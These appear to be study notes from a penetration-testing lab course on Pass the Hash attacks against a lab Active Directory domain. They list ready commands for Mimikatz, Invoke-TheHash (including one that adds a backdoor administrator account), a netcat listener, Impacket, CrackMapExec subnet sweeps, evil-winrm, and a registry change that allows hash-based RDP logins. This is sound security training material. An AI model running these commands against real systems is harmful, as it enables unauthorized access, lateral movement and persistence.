- A [Pass the Hash (PtH)](https://attack.mitre.org/techniques/T1550/002/) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. 
- The attacker doesn't need to decrypt the hash to obtain a plaintext password. 
- PtH attacks exploit the authentication protocol, as the password hash remains static for every session until the password is changed.
# Pass the Hash with Mimikatz (Windows)
- The first tool we will use to perform a Pass the Hash attack is [Mimikatz](https://github.com/gentilkiwi).
- Mimikatz has a module named `sekurlsa::pth` that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password.
	- `/user` - The user name we want to impersonate.
	- `/rc4` or `/NTLM` - NTLM hash of the user's password.
	- `/domain` - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
	- `/run` - The program we want to run with the user's context (if not specified, it will launch cmd.exe).
#### Pass the Hash from Windows Using Mimikatz:
```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user:administrator /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```
## Pass the Hash with PowerShell Invoke-TheHash (Windows)
#### Invoke-TheHash with SMB
```powershell
cd C:\tools\Invoke-TheHash\

Import-Module .\Invoke-TheHash.psd1

Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```
#### Netcat Listener
```powershell
.\nc.exe -lvnp 8001
```
https://www.revshells.com/
#### Invoke-TheHash with WMI
```powershell
Import-Module .\Invoke-TheHash.psd1

Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "<hash>"
```
# Pass the Hash with Impacket (Linux)
- [Impacket](https://github.com/SecureAuthCorp/impacket) has several tools we can use for different operations such as `Command Execution` and `Credential Dumping`, `Enumeration`, etc.
#### Pass the Hash with Impacket PsExec
```shell
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```
There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, such as:
- [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
- [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
- [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)
## Pass the Hash with CrackMapExec (Linux)
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. 
- We can use CrackMapExec to try to authenticate to some or all hosts in a network looking for one host where we can authenticate successfully as a local admin.
#### Pass the Hash with CrackMapExec
```shell
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```
#### CrackMapExec - Command Execution
```shell
crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```
## Pass the Hash with evil-winrm (Linux)
- [evil-winrm](https://github.com/Hackplayers/evil-winrm) is another tool we can use to authenticate using the Pass the Hash attack with PowerShell remoting. 
- If SMB is blocked or we don't have administrative rights, we can use this alternative protocol to connect to the target machine.
#### Pass the Hash with evil-winrm
```shell
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```
## Pass the Hash with RDP (Linux)
`Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:
![[Pasted image 20240725091441.png]]
This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of 0.
#### Enable Restricted Admin Mode to Allow PtH
```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
